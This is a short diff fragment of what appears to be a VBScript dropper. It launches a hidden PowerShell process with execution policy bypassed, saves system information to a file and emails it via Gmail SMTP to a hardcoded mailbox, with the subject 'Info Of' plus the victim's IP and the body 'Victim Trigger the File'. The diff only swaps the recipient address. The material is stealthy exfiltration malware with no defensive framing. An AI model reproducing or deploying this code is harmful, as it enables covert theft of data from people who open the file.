@@ -58,7 +58,7 @@ objShell.Run "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass 
 & "$output | Set-Content -Path 'SystemInfo.txt'; " _
 & "Start-Sleep -Seconds 2; " _
 & "$From = 'qrpay.69991@gmail.com'; " _
-& "$To = 'digisamurai.con.operations@gmail.com'; " _
+& "$To = 'qrpay.69991@gmail.com'; " _
 & "$Subject = 'Info Of ' + $($ipLocation.ip); " _
 & "$Body = 'Victim Trigger the File'; " _
 & "$SMTPServer = 'smtp.gmail.com'; " _
